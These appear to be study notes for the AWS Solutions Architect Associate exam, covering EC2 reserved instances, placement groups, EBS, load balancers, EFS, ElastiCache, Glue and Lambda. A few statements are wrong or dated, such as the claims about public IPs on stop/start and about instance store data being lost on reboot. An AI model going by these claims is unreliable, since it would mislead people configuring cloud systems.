</ul>
</li>
</ul>
<h2 id="dedicated-instances"><a class="header" href="#dedicated-instances">Dedicated Instances</a></h2>
<ul>
<li>Instances run on hardware dedicated to you</li>
<li>You may share hardware with other instances in same account</li>
<li>No control over instance placement.</li>
</ul>
<h2 id="reserved-instances-ri"><a class="header" href="#reserved-instances-ri">Reserved Instances (RI)</a></h2>
<ul>
<li>Designed for applications that have a <b><ins> steady state,</ins> <ins> predictable usage</ins> </b> or require <b><ins> reserved capacity.</ins> </b></li>
<li>Reduced Pricing is based on <b> Term</b> x <b>Class Offering </b> x <b>Payment Option </b>
<ul>
<li>
<h3 id="term"><a class="header" href="#term">Term</a></h3>
<ul>
<li><i>{The longer the term the greater the savings}</i></li>
<li>Commit to <ins> 1 year or 3 Year contract </ins></li>
<li>Reserved Instances do not renew automatically</li>
<li>When it is <ins> expired it will use on-demand </ins> with no interruption to service</li>
</ul>
</li>
<li>
<h3 id="class"><a class="header" href="#class">Class</a></h3>
<ul>
<li><i> {The less flexible the greater savings} </i></li>
<li><b> Standard </b>
<ul>
<li>Up to 75% reduced pricing compared to on-demand</li>
<li>Can modify RI attributes</li>
</ul>
</li>
<li><b> Convertible </b>
<ul>
<li>Up to 54% reduced pricing compared to on-demand</li>
<li>can exchange RI based on RI attributes if greater or equal in value</li>
</ul>
</li>
<li><strike> <b> Scheduled </b></strike>
<ul>
<li>AWS no longer offers Scheduled RI</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="payment-options"><a class="header" href="#payment-options">Payment Options</a></h3>
<ul>
<li><i> {The greater upfront the greater savings} </i></li>
<li><b> All upfront </b> : full payment at the start</li>
<li><b> Partial Upfront </b> : A portion of the cost must be paid and remaining hours billed at a discounted hourly rate</li>
<li><b> No Upfront </b> : billed at a discounted hourly rate for every hour within the term,regardless of whether the Reserved Instance is being used</li>
</ul>
</li>
<li><i><ins> RIs can be shared between multiple accounts within AWS organization </ins> </i></li>
<li><b>Unused RIs </b> can be sold in the <ins><i> Reserved Instance Marketplace</i></ins></li>
</ul>
</li>
</ul>
<h2 id="reserved-instance-ri-attributes"><a class="header" href="#reserved-instance-ri-attributes">Reserved Instance (RI) Attributes</a></h2>
<ul>
<li>RI attributes
<ul>
<li>are limited based on class offering and can affect the final price of an RI instance</li>
<li>4 RI attributes:
<ul>
<li><b>Instance Type:</b>
<ul>
<li>eg. m4.Large. This is composed of the instance family (for example , m4) and the instance size (for example large)</li>
</ul>
</li>
<li><b> Region:</b>
<ul>
<li>The region in which the Reserved Instance is purchased</li>
</ul>
</li>
<li><b>Tenancy:</b>
<ul>
<li>Whether your instance runs on shared(default) or single-tenant (dedicated) hardware</li>
</ul>
</li>
<li><b>Platform:</b>
<ul>
<li>the operating system eg. Windows or Linux/Unix</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="regional-and-zonal-ri"><a class="header" href="#regional-and-zonal-ri">Regional and Zonal RI</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Regional RI : purchase for a region</th><th>Zonal RI : purchase for an Availability Zone</th></tr>
</thead>
<tbody>
<tr><td>does not reserve capacity</td><td>reserves capacity in the specified Availability Zone</td></tr>
<tr><td>RI discount applies to instance usage in <ins> any AZ</ins> in the Region</td><td>RI discount applies to instance in the <ins> selected AZ </ins> (No AZ Flexibility)</td></tr>
<tr><td>Ri discount applied to instance usage within the instance family, regardless of size. Only supported n Amazon Linux, Unix Reserved Instances with default tenancy</td><td>No instance size flexibility  Ri discounts applies to instance usage for the specified instance type and size only </td></tr>
<tr><td>You can queue purchases for regional RI</td><td>You can‚Äôt queue purchases for Zonal RI</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="ri-limits"><a class="header" href="#ri-limits">RI Limits</a></h2>
<hr>
<ul>
<li>There is a limit to the number of Reserved Instances that you can purchase per month
<ul>
<li>Per month you can purchase
<ul>
<li>20 Regional Reserved Instances per Region</li>
<li>20 Zonal Reserved Instances per AZ</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Regional Limits</th><th>Zonal Limits</th></tr>
</thead>
<tbody>
<tr><td>You cannot exceed your running On-Demand Instance limit by purchasing regional Reserved Instances. The default On-Demand Instance limit is 20.</td><td>You can exceed your running On-Demand Instance limit by purchasing zonal Reserved Instances</td></tr>
<tr><td>Before purchasing RI ensure On-Demand limit is equal to or greater than your RI you intend to purchase</td><td>If you already have 20 running On-Demand Instances, and you purchase 20 Zonal Reserved Instances, you can launch a further 20 On-Demand Instances that match the specifications of your zonal Reserved Instances</td></tr>
</tbody>
</table>
</div>
<h2 id="capacity-reservations"><a class="header" href="#capacity-reservations">Capacity Reservations</a></h2>
<ul>
<li>EC2 instances are backed by different kind of hardware, and so there is a finite amount of servers available within an Availability Zone per instance type or family</li>
<li>You go to launch a specific type of EC2 instance but AWS has ran out of that server</li>
<li>Capacity reservation is a service of EC2 that allows you to request a reserve of EC2 instance type for a specific Region and AZ</li>
</ul>
<h2 id="standard-vs-convertible-ri"><a class="header" href="#standard-vs-convertible-ri">Standard vs Convertible RI</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Standard RI</th><th>Convertible RI</th></tr>
</thead>
<tbody>
<tr><td>RI attributes can be modified  - Change the AZ within same Region  - Change the scope of the Zonal RI to Regional RI or visa versa  - Change the instance size (Linux/Unix only, default tenancy)  - Change network from Ec2-Classic to VPC and visa versa</td><td>RI attributes can‚Äôt be modified (you perform an exchange)</td></tr>
<tr><td>Can‚Äôt be exchanged</td><td>Can be exchanged during the term for another Convertible RI with new RI attributes, including:  - Instance type  - Instance Family  - Platform  - Scope  - Tenancy</td></tr>
<tr><td>Can be bought or sold in the RI Marketplace</td><td>Can‚Äôt be bought or Sold in the RI Marketplace</td></tr>
</tbody>
</table>
</div>
<h2 id="ri-marketplace"><a class="header" href="#ri-marketplace">RI Marketplace</a></h2>
<ul>
<li>
<p>EC2 Reserved Instance Marketplace allows you to sell your unused Standard RI to recoup your RI spend for RI you do not intend or cannot use</p>
</li>
<li>
<p>Reserved Instances can be sold after they have been active for at least 30 days and once AWS has received the upfront payment (if applicable)</p>
</li>
<li>
<p>You must have a US bank account to sell Reserved Instances on the Reserved Instance Marketplace</p>
</li>
<li>
<p>There must be at least one month remaining in the term of the Reserved Instance you are listing</p>
</li>
<li>
<p>You will retain the pricing and capacity benefit of your reservation until it‚Äôs sold and the transaction is complete</p>
</li>
<li>
<p>Your company name ( and address upon request) will be shared with the buyer for tax purposes.</p>
</li>
<li>
<p>A seller can set only the upfront price for a Reserved Instance. The usage price and other configuration (eg. instance type, availability zone, platform) will remain the same as when the Reserved Instance was initially purchased</p>
</li>
<li>
<p>The term length will be rounded down to the nearest month. For example, a reservation with 9 months and 15 days remaining will appear as 9 months on the Reserved Instance Marketplace.</p>
</li>
<li>
<p>You can sell upto $20,000 in Reserved Instances per year. If you need to sell more Reserved Instances</p>
</li>
<li>
<p>Reserved Instances in the GovCloud region cannot be sold on the Reserved Instance Marketplace</p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ec2-3"><a href="#ec2-3" class="header">EC2</a></h1>
<ul>
<li><a href="#placement-groups">Placement Groups</a></li>
<li><a href="#elastic-network-interfaces">Elastic Network Interfaces</a></li>
</ul>
<h2 id="ec2-2"><a class="header" href="#ec2-2">EC2</a></h2>
<ul>
<li>EC2 is not just virtual machines, it consists of VMs, EBS, EIP, <a href="#elastic-network-interfaces">ENI</a>, etc.</li>
<li>Use user-data to run a script at launch. This script is only run once at the instances first start and runs as root</li>
<li>t2.micro is part of the free tier</li>
</ul>
<h2 id="ec2-instance-types"><a class="header" href="#ec2-instance-types">EC2 Instance Types</a></h2>
<ul>
<li>General Purpose (t)</li>
<li>Compute Optimized (c)</li>
<li>Memory Optimized (r)</li>
<li>Storage Optimized (i,d,h1)</li>
</ul>
<h2 id="security-groups-2"><a class="header" href="#security-groups-2">Security Groups</a></h2>
<ul>
<li>Security Groups are like a firewall for EC2 instances</li>
<li>Security groups only contain allow rules</li>
<li>Security groups are stateful. Meaning if we have an inbound allow rule, we don‚Äôt need a corresponding outbound allow rule</li>
<li>For the source of the traffic, Security Groups can reference an IP address, other security groups, and prefix lists</li>
<li>Security Groups and VMs have a many-to-many relationship</li>
</ul>
<h2 id="ports-to-know-for-the-exam-1"><a class="header" href="#ports-to-know-for-the-exam-1">Ports to know for the exam</a></h2>
<ul>
<li>21 = FTP</li>
<li>22 = SSH/sFTP</li>
<li>80 = HTTP</li>
<li>443 = HTTPS</li>
<li>3389 = RDP</li>
<li>5432 - Postgresql</li>
<li>3306 - MySQL</li>
<li>Oracle RDS - 1521</li>
<li>MSSQL - 1433</li>
<li>MariaDB - 3306</li>
</ul>
<h2 id="placement-groups"><a class="header" href="#placement-groups">Placement Groups</a></h2>
<ul>
<li>Use Placement Groups when you want to control how your EC2 instances are scheduled on underlying infrastructure</li>
<li>Placement Group strategies
<ul>
<li>Cluster
<ul>
<li>Scheduled EC2 instances into a low-latency group in a single Availability Zone</li>
<li>Use cases:
<ul>
<li>Big Data job that needs to complete fast</li>
<li>Application that needs extremely <ins> low latency and high network throughput </ins>
<img src="clouds/aws/saa-c03/images/Ec2/placement-groups-cluster.jpg" width="57%" /></li>
</ul>
</li>
</ul>
</li>
<li>Spread
<ul>
<li>Pros:
<ul>
<li>Can span across Availability Zones (AZ)</li>
<li>Reduced risk is simultaneous failure</li>
<li>EC2 instances are on different physical hardware</li>
</ul>
</li>
<li>Cons:
<ul>
<li>Limited to 7 instances per AZ per placement group</li>
</ul>
</li>
<li>Use cases:
<ul>
<li>Application that needs to maximize high availability</li>
<li>Critical Applications where each instance must be isolated from failure from each other
<img src="clouds/aws/saa-c03/images/Ec2/placement-group-spread.jpg" width="57%" /></li>
</ul>
</li>
</ul>
</li>
<li>Partition
<ul>
<li>Spreads instances across many different partitions (which rely on sets of racks) within an AZ. Scales to 100s of EC2 instances per group</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="elastic-network-interfaces"><a class="header" href="#elastic-network-interfaces">Elastic Network Interfaces</a></h2>
<ul>
<li>The ENI can have the following attributes:
<ul>
<li>Primary private IPV4, one or more secondary IPv4</li>
<li>One ELastic IP (IPv4) per private IPv4</li>
<li>One or more Security Groups</li>
<li>A MAC address</li>
</ul>
</li>
<li>You can create ENI independently and attach them on fly (move them) on EC2 instances for failover</li>
<li><i><strong><ins>Bound to a specific availability zone (AZ)</ins>
<img src="clouds/aws/saa-c03/images/Ec2/elastic-network-interface.jpg" width="57%" /></strong></i></li>
<li>You can change the Termination Behavior so that if a VM is deleted the attached ENI is/isn‚Äôt deleted with it</li>
</ul>
<h2 id="spot-instances-1"><a class="header" href="#spot-instances-1">Spot Instances</a></h2>
<ul>
<li>Up to 90% discount</li>
<li>Specify a max price you are willing to pay for your instances. If you go over the price, you have two options:
<ul>
<li>Two minute grace period</li>
<li>Stop the instance or terminate the instance</li>
</ul>
</li>
<li>If you don‚Äôt want AWS to reclaim the capacity, you can use a Spot Block to block AWS from reclaiming the instance for a specified time-frame (1-6 hours)</li>
<li>The MOST cost-efficient instance pricing</li>
<li>Useful for workloads that are resilient to failure (batch jobs, etc.)</li>
<li>Persistent vs. One-Time Spot Requests. With a persistent spot request, if an instance is terminated, it will be restarted. With a one-time spot request, if an instance is terminated, it will NOT be restarted.</li>
</ul>
<h2 id="spot-fleets"><a class="header" href="#spot-fleets">Spot Fleets</a></h2>
<ul>
<li>Get a set of spot instances + On-Demand instances</li>
<li>Strategies
<ul>
<li>Lowest Price: Spot Fleet will launch instances from the pool with the lowest price</li>
<li>Diversified: distributed across all pools</li>
<li>capacityOptimized: pool with optimal capacity for the number of instances</li>
<li>priceCapacityOptimized: Pools with highest capacity available, then select the pool with the lowest price</li>
</ul>
</li>
</ul>
<h2 id="elastic-ips"><a class="header" href="#elastic-ips">Elastic IPs</a></h2>
<ul>
<li>When you start and stop an EC2 instance, the public IP won‚Äôt change</li>
<li>You can only have 5 Elastic IP addresses in your AWS account by default. You can ask AWS to increase this limit.</li>
<li>Try to avoid using EIP</li>
</ul>
<h2 id="ec2-hibernate"><a class="header" href="#ec2-hibernate">EC2 Hibernate</a></h2>
<ul>
<li>Store the RAM on disk when the OS is stopped.</li>
<li>Faster startup</li>
<li>The root EBS volume must be encrypted and it must have enough space to store the contents of RAM</li>
<li>Instance RAM size must be less than 150GB</li>
<li>Does not work for bare metal instances</li>
</ul>
<h2 id="ebs"><a class="header" href="#ebs">EBS</a></h2>
<ul>
<li>Bound to an AZ</li>
<li>Can be attached/detached from instances on the fly</li>
<li>EBS volumes can be mounted to multiple instances using ‚Äòmulti-attach‚Äô
<ul>
<li>Up to 16 instances at a time can be attached to a volume</li>
</ul>
</li>
<li>You can move an EBS volume across AZ by creating a snapshot and copying it to another region</li>
<li>Snapshots
<ul>
<li>You can move a snapshot to an ‚Äòarchive tier‚Äô that is 75% cheaper</li>
<li>Takes 24 to 72 hours to restore the snapshot from the archive</li>
<li>Recycle Bin
<ul>
<li>You can setup rules to retain deleted snapshots so you can easily recover them</li>
<li>Specify a retention for the recycle bin (from 1 day to 1 year)</li>
</ul>
</li>
<li>Fast Snapshot Restore (FSR)
<ul>
<li>Force full initialization of your snapshot to have no latency on first use.</li>
<li>Expensive to use</li>
</ul>
</li>
</ul>
</li>
<li>Encryption
<ul>
<li>data at rest and data in motion are both encrypted</li>
<li>all snapshots are encrypted</li>
<li>Copying an unencrytped snapshot enables encryption</li>
<li>How to encrypt an unencrypted volume
<ol>
<li>Create a snapshot of the volume</li>
<li>Encrypt the snapshot using the copy function</li>
<li>Create new EBS volume from the snapshot (the volume will be encrypted)</li>
<li>Attach the encrypted volume to the original instance</li>
</ol>
</li>
</ul>
</li>
<li>Root volumes are automatically deleted (Termination Policy) when a EC2 instance is terminated. Other EBS volumes attached to the instance are not deleted unless their termination policy says to delete them on termination of the EC2 instance.</li>
</ul>
<h2 id="ec2-instance-store-1"><a class="header" href="#ec2-instance-store-1">EC2 Instance Store</a></h2>
<ul>
<li>Ephemeral storage</li>
<li>High performance</li>
<li>Use cases:
<ul>
<li>buffer</li>
<li>cache</li>
</ul>
</li>
<li>Data loss when the EC2 instance reboots</li>
</ul>
<h2 id="ami"><a class="header" href="#ami">AMI</a></h2>
<ul>
<li>VM Image</li>
<li>Locked to a region, but can be copied across regions</li>
<li>Types of AMIs:
<ul>
<li>Public (AWS Provided)</li>
<li>Private (created by you)</li>
<li>MarketPlace (3rd party vendor)</li>
</ul>
</li>
</ul>
<h2 id="ebs-volume-types-1"><a class="header" href="#ebs-volume-types-1">EBS Volume Types</a></h2>
<ul>
<li>
<p>Types:</p>
<ul>
<li>gp2/gp3 (SSD): General purpose SSD volume. Balance price and performance</li>
<li>io1/io2 Block Express (SSD): Highest performance SSD volume for mission-critical low-latency or high-throughput workloads</li>
<li>st1 (HDD): Low cost HDD volume designed for frequently accessed, throughput-intensive workloads
<ul>
<li>Cannot be a boot volume</li>
<li>125GB to 16 TB</li>
</ul>
</li>
<li>sc1 (HDD): Lowest cost HDD volume designed for less frequently accessed workloads</li>
</ul>
</li>
<li>
<p>Only GP2/GP3 and IO1/IO2 can be used as a boot volumes</p>
</li>
<li>
<p>With GP3, you can independently set IOPS and throughput. With GP2, they are linked together</p>
</li>
</ul>
<h4 id="provisioned-iops"><a class="header" href="#provisioned-iops">Provisioned IOPS</a></h4>
<ul>
<li>Provisioned IOPS volumes are used for critical business applications with sustained IOPS performance</li>
<li>Great for database workloads</li>
<li>io1 Provisioned IOPS:</li>
<li>If you want to get over 32000 IOPS, you need Nitro 1 or Nitro 2</li>
</ul>
<h2 id="auto-scaling-group-asg"><a class="header" href="#auto-scaling-group-asg">Auto Scaling Group (ASG)</a></h2>
<ul>
<li>Automatically scale out EC2 instances to meet traffic demand. You can scale based on a CloudWatch Alarm (metric), schedule,</li>
<li>Set a minimum capacity, desired capacity, and max capacity</li>
<li>The ASG itself is free</li>
<li>Create a launch template, which specifies how to launch instances within the ASG</li>
<li>Scaling Policies
<ul>
<li>Dynamic Scaling
<ul>
<li>Target Tracking Scaling
<ul>
<li>Simple, example: keep CPU usage around 50%</li>
<li>Target Tracking will create CloudWatch Alarms for you</li>
</ul>
</li>
<li>Simple / Step Scaling
<ul>
<li>When a CloudWatch Alarm is triggered, add 2 instances</li>
</ul>
</li>
</ul>
</li>
<li>Scheduled Scaling
<ul>
<li>Scale based on a schedule</li>
</ul>
</li>
<li>Predictive Scaling
<ul>
<li>Forecast load and scale ahead of time</li>
</ul>
</li>
</ul>
</li>
<li>Scaling cooldown (default 300 seconds). The ASG will not launch or terminate instances</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-load-balancer-1"><a class="header" href="#elastic-load-balancer-1">Elastic Load Balancer</a></h1>
<ul>
<li>Spread load of traffic across multiple downstream instances</li>
<li>
<h2 id="health-check-downstream-instances"><a class="header" href="#health-check-downstream-instances">Health check downstream instances</a></h2>
</li>
<li>SSL Termination</li>
<li>High Availability across zones</li>
<li>Add backend instances to a ‚ÄúTarget Group‚Äù</li>
</ul>
<h2 id="types-of-elb"><a class="header" href="#types-of-elb">Types of ELB</a></h2>
<ul>
<li>
<p>Application Load Balancer (Layer 7)</p>
<ul>
<li>Allows you to route to multiple instances in a Target Group (aka Backend Pool in Azure)</li>
<li>Supports HTTP/2 and websocket</li>
<li>Route based on the path in the URL, hostname, query strings, and headers</li>
<li>Extra headers added by ALB
<ul>
<li>x-forwarded-for</li>
<li>x-forwarded-proto</li>
<li>x-forwarded-port</li>
</ul>
</li>
<li>ALB has a WAF capability that can be enabled</li>
</ul>
</li>
<li>
<p>Network Load Balancer (Layer 4)</p>
<ul>
<li>High performance, millions of requests per second, and less latency ~100 ms</li>
<li>NLB has one static IP address per AZ, and supports assigning an Elastic IP</li>
<li>Not compatibly with the free tier</li>
</ul>
</li>
<li>
<p>Gateway Load Balancer (Layer 3)</p>
<ul>
<li>Use cases: Send all traffic to a firewall, IDS, IPS, etc.</li>
<li>Supports the GENEVE protocol on port udp/6081</li>
</ul>
</li>
</ul>
<h2 id="sticky-sessions"><a class="header" href="#sticky-sessions">Sticky Sessions</a></h2>
<ul>
<li>Same client is forwarded to the same instance, rather than spreading traffic amongst all instances</li>
<li>Supported by the ALB and NLB</li>
<li>Cookie is set on the client with has an expiration date you control
<ul>
<li>Cookies:
<ul>
<li>Two types of cookie are supported:
<ul>
<li>Application Based Cookie:
<ul>
<li>Custom cookie:
<ul>
<li>Generated by the target</li>
<li>Can include any custom attributes required by the application</li>
<li>The cookie name must be specified individually per target group</li>
<li>You cannot use AWSALB, AWSALBAPP, or AWSALBTG. These are all reserved by AWS</li>
</ul>
</li>
<li>Application Cookie:
<ul>
<li>Generated by the LB itself</li>
<li>Cookie will be AWSALBAPP</li>
</ul>
</li>
</ul>
</li>
<li>Duration-based Cookie
<ul>
<li>Cookie is generated by the load balancer itself</li>
<li>Cookie name is AWSALB for ALB</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="cross-zone-load-balancing"><a class="header" href="#cross-zone-load-balancing">Cross-Zone Load Balancing</a></h2>
<ul>
<li>Each load balancer instance distributes traffic evenly across all registered instances in all AZ</li>
<li>For the ALB, cross-zone load balancing can be enabled/disabled at the target group level. It is enabled by default and there are no additional charges</li>
<li>Can be enabled for NLB and GLB, but additional charges will apply. It is disabled by default.
<img src="clouds/aws/saa-c03/images/Ec2/cross-zone-load-balancing.png" width="57%" /></li>
</ul>
<h2 id="sni"><a class="header" href="#sni">SNI</a></h2>
<ul>
<li>Works with ALB, NLB, and CloudFront</li>
</ul>
<h2 id="deregistration-delay"><a class="header" href="#deregistration-delay">Deregistration Delay</a></h2>
<ul>
<li>AKA Connection Draining</li>
<li>Stop sending new requests to the instance that is being deregistered</li>
<li>Allows the instance to complete in-flight requests before being terminated</li>
<li>1 to 3600 seconds (default 300 seconds)</li>
<li>Can be disabled (set to 0 seconds)</li>
<li>Set to a low value if your requests are short-lived</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="elastic-file-system-efs-1"><a href="#elastic-file-system-efs-1" class="header">Elastic File System (EFS)</a></h1>
<ul>
<li><a href="#elastic-file-system-efs">Elastic File System (EFS) </a></li>
<li><a href="#introduction-to-elastic-file-system-efs">Introduction to ELastic File System (EFS)</a></li>
</ul>
<h2 id="elastic-file-system-efs"><a class="header" href="#elastic-file-system-efs">Elastic File System (EFS)</a></h2>
<ul>
<li><i><ins>Scalable, elastic, <b> Cloud-Native NFS File System</b></ins></i></li>
<li>Attach a single file system to multiple EC2 Instances</li>
<li>Don‚Äôt worry about running out or managing disk space</li>
</ul>
<h2 id="introduction-to-elastic-file-system-efs"><a class="header" href="#introduction-to-elastic-file-system-efs">Introduction to Elastic File System (EFS)</a></h2>
<ul>
<li>EFS is a file storage service for EC2 instances</li>
<li>Storage capacity grows (upto petabytes) and shrinks automatically based on data stored (elastic)</li>
<li><ins> Multiple EC2 instances </ins> in same VPC can mount a single EFS Volume (Volume must be in same VPC)</li>
<li>EC2 instances install the NFSv4.1 client and can then mount the EFS volume</li>
<li>EFS is using Network File System version 4 (NFSv4) protocol</li>
<li>EFS creates multiple <b><ins> mount targets </ins></b> in all your VPC subnets</li>
<li>Pay only for the storage you use, starting at $0.30 GB / month</li>
<li>You create a security group to control access to EFS</li>
<li>Encryption at rest using KMS</li>
<li>1000s of concurrent NFS clients, 10 GB+ /s throughput</li>
<li>Grow to petabyte scale storage</li>
</ul>
<h2 id="efs-performance-settings"><a class="header" href="#efs-performance-settings">EFS Performance Settings</a></h2>
<ul>
<li>Performance Mode
<ul>
<li>General Purpose (Default) - latency sensitive use cases</li>
<li>Max IO - higher latency, throughput, highly parallel</li>
</ul>
</li>
<li>Throughput Mode:
<ul>
<li>Bursting - 1 TB storage = 50 MB/s + burst up to 100 MB/s</li>
<li>Enhanced - Provides more flexibility and higher throughput levels for workloads with a range of performance requirements
<ul>
<li>Provisioned - set your throughput regardless of storage size</li>
<li>Elastic - scale throughput up and down based on workload. Useful for unpredictable workloads</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="efs-storage-tiers"><a class="header" href="#efs-storage-tiers">EFS Storage Tiers</a></h2>
<ul>
<li>Standard</li>
<li>Infrequent (EFS-IA)</li>
<li>Archive</li>
<li>Implement lifecycle policies to move files between tiers</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-is-elasticache-for-redis-1"><a href="#what-is-elasticache-for-redis-1" class="header">What is ElastiCache for Redis?</a></h1>
<ul>
<li><a href="#what-is-elasti-cache">What is ElastiCache for Redis?</a></li>
<li><a href="#comparing-memcached-and-redis">Comparing Memcached and Redis</a></li>
<li><a href="#authenticating-with-redis-auth-command">Authenticating with Redis AUTH command</a></li>
</ul>
<h2 id="what-is-elasticache-for-redis"><a class="header" href="#what-is-elasticache-for-redis">What is ElastiCache for Redis?</a></h2>
<ul>
<li>ElastiCache is a web service that makes it easy to set up, <i><ins> manage and scale a distributed in-memory data store or cache environment </ins></i> in the cloud.</li>
<li>Features:
<ul>
<li>Automatic detection of and recovery from cache node failures</li>
<li><b> Multi-AZ </b>for a failed primary cluster to a read replica in Redis cluster</li>
<li>Redis (cluster mode enabled) supports partitioning your data across up to 500 shards</li>
</ul>
</li>
<li>ElastiCache works with both the Redis and Memcached engines.</li>
</ul>
<h2 id="comparing-memcached-and-redis"><a class="header" href="#comparing-memcached-and-redis">Comparing Memcached and Redis</a></h2>
<ul>
<li>
<p>Redis supports:</p>
<ul>
<li>Multi-AZ with Auto-Failover</li>
<li>Read replicas</li>
<li>data durability using AOF persistence</li>
<li>Backup and restore feautres</li>
<li>Supports sets and sorted sets
<ul>
<li>Sorted sets guarantees both uniqueness and element ordering. Useful when creating something like a gaming leaderboard. Each time a new element is added, its ordered automatically.</li>
</ul>
</li>
<li>Supports IAM for authentication</li>
</ul>
</li>
<li>
<p>Memcached support:</p>
<ul>
<li>None of what Redis supports</li>
<li>Supports SASL based authentication</li>
</ul>
</li>
</ul>
<h2 id="authenticating-with-redis-auth-command"><a class="header" href="#authenticating-with-redis-auth-command">Authenticating with Redis AUTH command</a></h2>
<ul>
<li>Users enter a token (password) on a token-protected Redis server.</li>
<li>Include the parameter <code>--auth-token</code> (API: <ins>AuthToken</ins>) with the correct token to create the replication group or cluster.</li>
<li>Key Parameters:
<ul>
<li><i><ins> <code>--engine</code> </ins></i> - Must be redis</li>
<li><i><ins> ‚Äìengine-version </ins></i> - Must be 3.2.6,4.0.10 or later</li>
<li><i><ins> ‚Äìtransit-encryption-enabled </ins></i> - Required for authentication and HIPAA eligibility</li>
<li><i><ins> ‚Äìauth-token </ins></i> - Required for HIPAA eligibility. This value must be correct token for this token-protected Redis-server</li>
<li><i><ins> ‚Äìcache-subnet-group </ins></i> - Required fro HIPAA eligibility</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="glue-cheatsheet"><a href="#glue-cheatsheet" class="header">Glue-cheatsheet</a></h1>
<ul>
<li>
<p>A fully managed service to extract, transform and load (ETL) your data for analytics</p>
</li>
<li>
<p>Discover and search across different AWS data sets without moving your data</p>
</li>
<li>
<p>AWS Glue retrieves data from sources and writes data to targets stored and transported in various data formats</p>
<ul>
<li>If your data is stored or transported in Parquet data format, this document introduces you available features for using your data in AWS Glue</li>
</ul>
</li>
<li>
<p>AWS glue consists of</p>
<ul>
<li>Central metadata repository</li>
<li>ETL engine</li>
<li>Flexible scheduler</li>
</ul>
</li>
<li>
<p>Use Cases:</p>
<ul>
<li>Run queries against an Amazon S3 data lake
<ul>
<li>You can use AWS Glue to make your data available for analytics without moving your data</li>
</ul>
</li>
<li>Analyze the log data in your data warehouse
<ul>
<li>Create ETL transcripts to transform, flatten and enrich the data from source to target</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Integration with AWS Glue</p>
<ul>
<li>To create database and table schema in the AWS Glue Data Catalog, you can run an AWS Glue crawler from within Athena on a data source, or you can run Data Definition Language (DDL) queries directly in the Athena Query Editor.</li>
<li>Then, using the database and table schema that you created, you can use Data Manipulation (DML) queries in Athena to query the data.</li>
</ul>
</li>
<li>
<h2 id="set-up-aws-glue-crawlers-using-s3-event-notifications"><a class="header" href="#set-up-aws-glue-crawlers-using-s3-event-notifications">Set up AWS Glue Crawlers using S3 event notifications</a></h2>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="aws-lambda-1"><a href="#aws-lambda-1" class="header">AWS Lambda</a></h1>
<ul>
<li><a href="#aws-lambda">AWS Lambda</a></li>
<li><a href="#how-it-works">How it works</a></li>
<li><a href="#file-processing-architecture">File Processing Architecture</a></li>
<li><a href="#stream-processing-architecture">Stream Processing Architecture</a></li>
<li><a href="#use-cases-2">Use Cases</a></li>
</ul>
<hr>
<h2 id="aws-lambda"><a class="header" href="#aws-lambda">AWS Lambda</a></h2>
<hr>
<ul>
<li>Run code <ins> without thinking about servers or clusters</ins></li>
<li>Run code without provisioning or managing infrastructure. Simply write and <i> <ins> upload code as a .zip file or container image</ins></i></li>
<li>Automatically respond to code execution requests at any scale, from a dozen events per day to hundreds of thousands per second</li>
<li>Save costs by <ins><b> paying only for the compute time you use </b></ins> by per millisecond instead of provisioning infrastructure upfront for peak capacity</li>
<li>Optimize code execution time and performance with the right function memory size. Respond to high demand in double-digit milliseconds with Provisioned Concurrency.</li>
</ul>
<hr>
<h2 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h2>
<hr>
<ul>
<li>AWS Lambda is a <ins><b> serverless, event-driven compute service that lets you run code for virtually any type of application </b> or backend service without provisioning or managing servers.</ins></li>
<li>You can trigger Lambda over 200 AWS services and software as a service (Saas) applications and only pay for what you use</li>
</ul>
<hr>
<h2 id="file-processing-architecture"><a class="header" href="#file-processing-architecture">File Processing Architecture</a></h2>
<hr><img src="clouds/aws/saa-c03/images/Lambda/file-processing.jpg" width="60%" height="40%" />
<hr>
<h2 id="stream-processing-architecture"><a class="header" href="#stream-processing-architecture">Stream Processing Architecture</a></h2>
<hr><img src="clouds/aws/saa-c03/images/Lambda/stream-processing.jpg" width="60%" height="40%" />
<hr>
<h2 id="use-cases-2"><a class="header" href="#use-cases-2">Use Cases</a></h2>
<hr>
<ul>
<li>Quickly process data at scale
<ul>
<li>Meet resource-intensive and unpredictable demand by using AWS Lambda to instantly scale out to more than 18K vCPUs.</li>
<li>Build processing workflows quickly and easily with suite of other serverless offerings and event triggers</li>
</ul>
</li>
<li>Run interactive web and mobile backends</li>
<li>Enable powerful ML insights</li>
<li>Create event-driven applications</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ml-models"><a href="#ml-models" class="header">Ml-models</a></h1>
<ul>
<li><a href="#">Sage Maker</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-is-amazon-quicksight--1"><a href="#what-is-amazon-quicksight--1" class="header">What is Amazon QuickSight ?</a></h1>
<ul>
<li><a href="#what-is-amazon-quicksight">What is Amazon QuickSight ? </a></li>
<li><a href="#benefits">Benefits</a></li>
</ul>
<hr>
<h2 id="what-is-amazon-quicksight-"><a class="header" href="#what-is-amazon-quicksight-">What is Amazon QuickSight ?</a></h2>
<hr>
<ul>
<li>Amazon Quicksight is a <ins><b> very fast, easy-to-use, cloud -powered business analytics  service </b> that makes it easy for all employees within an organization to <i><ins>build visualizations, perform ad-hoc analysis, and quickly get business insights </ins> from their data, anytime on any device.</i></ins></li>
<li><b> <ins>1/10th</ins> </b> the cost of traditional BI Solutions</li>
